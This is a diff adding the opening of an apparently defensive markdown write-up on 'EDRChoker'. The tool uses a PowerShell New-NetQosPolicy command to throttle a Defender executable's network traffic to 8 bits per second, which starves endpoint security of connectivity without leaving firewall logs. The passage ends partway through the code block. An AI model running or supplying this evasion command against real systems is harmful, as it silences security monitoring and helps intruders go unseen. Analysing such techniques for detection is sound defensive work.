@@ -1,0 +1,9 @@
+## Part 1: How EDRChoker Actually Works (And Why Detection Matters)
+
+
+EDRChoker operates at the NDIS layer using `New-NetQosPolicy` to create Quality of Service throttle policies. Instead of blocking traffic (which generates firewall logs), it starves bandwidth:
+
+```powershell
+New-NetQosPolicy -Name "policy-name" `
+  -AppPathNameMatchCondition "C:\Program Files\...\Defender.exe" `
+  -ThrottleRateActionBitsPerSecond 8  # 8 bits/second = death by a thousand timeouts
